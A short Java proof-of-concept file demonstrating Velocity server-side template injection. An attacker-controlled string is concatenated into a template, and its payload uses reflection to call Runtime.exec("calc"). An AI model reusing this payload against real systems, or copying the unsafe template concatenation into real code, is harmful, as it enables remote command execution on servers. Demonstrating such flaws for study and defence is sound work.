package com.llu.vul;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;

import java.io.IOException;
import java.io.StringWriter;

public class VulPocTest {
    public static void main(String[] args) throws IOException {
//        String username = "外部攻击者可控输入";
        String username = "#set($e=\"e\")\n" +
                "$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\")";
        String templateString = "Hello, " + username + " | Full name: $name, phone: $phone, email: $email";

        Velocity.init();
        VelocityContext ctx = new VelocityContext();
        ctx.put("name", "test");
        ctx.put("phone", "123456789");
        ctx.put("email", "12321@qq.com");

        StringWriter out = new StringWriter();
        // 将模板字符串和上下文对象传递给Velocity引擎进行解析和渲染
        Velocity.evaluate(ctx, out, "test", templateString);

        // 输出velocity渲染结果
        System.out.println(out);

    }
}
